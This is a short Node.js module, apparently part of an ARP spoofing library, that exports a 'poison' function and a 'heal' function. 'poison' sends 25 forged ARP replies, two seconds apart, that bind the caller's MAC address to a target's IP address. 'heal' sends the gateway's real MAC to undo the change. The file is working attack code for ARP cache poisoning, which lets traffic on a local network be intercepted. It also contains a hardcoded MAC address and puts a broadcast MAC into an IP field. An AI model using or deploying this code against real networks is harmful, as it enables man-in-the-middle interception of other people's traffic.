#!/usr/bin/env node

var arp_table = require('./arp_table.js');
var arp_packet = require('./packet.js');

exports.send = arp_packet.send;
exports.setInterface = arp_packet.setInterface;
exports.cache = arp_table.fetch;

exports.poison = function(target, self){
  repeat(25, {
    'op': 'reply'
  , 'src_ip': self.IP
  , 'src_mac': self.MAC
  , 'dst_ip':  (target.IP != '*' ? target.IP : 'ff:ff:ff:ff:ff:ff')
  , 'dst_mac': (target.IP != '*' ? target.MAC : '10:a5:d0:49:ac:cc')
  })
}

exports.heal = function(target, gateway){
  if ( typeof interval != "undefined" )
    clearInterval(interval)
  if (!target || !gateway)
    return false;
  repeat(25, {
    'op': 'reply'
  , 'src_ip': gateway.IP
  , 'src_mac': gateway.MAC
  , 'dst_ip':  (target.IP != '*' ? target.IP  : 'ff:ff:ff:ff:ff:ff')
  , 'dst_mac': (target.IP != '*' ? target.MAC : 'ff:ff:ff:ff:ff:ff')                                                                                               // Add Target MAC
  })
}

var repeat = function(i, packet){
  count = 0
  interval = setInterval(function(){
    arp_packet.send(packet);
    count++
    if (count == i)
      clearInterval(interval)
  },2000)
}
